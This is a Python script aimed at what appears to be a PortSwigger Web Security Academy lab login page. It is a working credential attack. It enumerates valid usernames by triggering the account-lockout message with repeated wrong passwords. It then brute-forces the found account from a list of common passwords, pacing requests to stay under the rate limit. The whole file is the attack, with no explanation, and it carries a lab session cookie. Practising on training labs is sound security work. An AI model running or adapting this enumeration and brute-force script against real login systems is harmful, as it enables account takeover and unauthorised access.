import requests
import time

# Target settings
url = "https://0a86007d0469da6580c35894005d0050.web-security-academy.net/login"
cookies = {"session": "Po6QnQlMaVyONVLXNASE20Mr4iA6m5Qg"}
headers = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:141.0) Gecko/20100101 Firefox/141.0",
    "Content-Type": "application/x-www-form-urlencoded"
}

# --- Arrays for usernames and passwords ---
usernames = [
    "carlos", "root", "admin", "test", "guest", "info", "adm", "mysql", "user",
    "administrator", "oracle", "ftp", "pi", "puppet", "ansible", "ec2-user",
    "vagrant", "azureuser", "academico", "acceso", "access", "accounting",
    "accounts", "acid", "activestat", "ad", "adam", "adkit", "admin",
    "administracion", "administrador", "administrator", "administrators",
    "admins", "ads", "adserver", "adsl", "ae", "af", "affiliate", "affiliates",
    "afiliados", "ag", "agenda", "agent", "ai", "aix", "ajax", "ak", "akamai",
    "al", "alabama", "alaska", "albuquerque", "alerts", "alpha", "alterwind",
    "am", "amarillo", "americas", "an", "anaheim", "analyzer", "announce",
    "announcements", "antivirus", "ao", "ap", "apache", "apollo", "app",
    "app01", "app1", "apple", "application", "applications", "apps",
    "appserver", "aq", "ar", "archie", "arcsight", "argentina", "arizona",
    "arkansas", "arlington", "as", "as400", "asia", "asterix", "at", "athena",
    "atlanta", "atlas", "att", "au", "auction", "austin", "auth", "auto",
    "autodiscover"
]

passwords = [
    "123456", "password", "12345678", "qwerty", "123456789", "12345", "1234",
    "111111", "1234567", "dragon", "123123", "baseball", "abc123", "football",
    "monkey", "letmein", "shadow", "master", "666666", "qwertyuiop", "123321",
    "mustang", "1234567890", "michael", "654321", "superman", "1qaz2wsx",
    "7777777", "121212", "000000", "qazwsx", "123qwe", "killer", "trustno1",
    "jordan", "jennifer", "zxcvbnm", "asdfgh", "hunter", "buster", "soccer",
    "harley", "batman", "andrew", "tigger", "sunshine", "iloveyou", "2000",
    "charlie", "robert", "thomas", "hockey", "ranger", "daniel", "starwars",
    "klaster", "112233", "george", "computer", "michelle", "jessica", "pepper",
    "1111", "zxcvbn", "555555", "11111111", "131313", "freedom", "777777",
    "pass", "maggie", "159753", "aaaaaa", "ginger", "princess", "joshua",
    "cheese", "amanda", "summer", "love", "ashley", "nicole", "chelsea",
    "biteme", "matthew", "access", "yankees", "987654321", "dallas", "austin",
    "thunder", "taylor", "matrix", "mobilemail", "mom", "monitor", "monitoring",
    "montana", "moon", "moscow"
]

# Limit: 100 requests per minute = 1 request every 0.6s
RATE_LIMIT = 0.6

# --- Stage 1: Find valid username ---
valid_user = None
for user in usernames:
    for i in range(5):
        data = {"username": user, "password": f"wrongpass{i}"}
        r = requests.post(url, headers=headers, cookies=cookies, data=data)

        if "You have made too many incorrect login attempts" in r.text:
            print(f"[+] Found valid username: {user}")
            valid_user = user
            break
        time.sleep(RATE_LIMIT)  # enforce rate limit

    if valid_user:
        break

if not valid_user:
    print("[-] No valid username found.")
    exit()

# --- Stage 2: Brute-force password ---
print(f"[*] Starting password brute-force for {valid_user}...")
for pw in passwords:
    data = {"username": valid_user, "password": pw}
    r = requests.post(url, headers=headers, cookies=cookies, data=data)

    if "Incorrect password" not in r.text and "too many" not in r.text:
        print(f"[+] SUCCESS! Username: {valid_user} | Password: {pw}")
        break

    time.sleep(RATE_LIMIT)  # enforce rate limit
else:
    print("[-] No valid password found.")
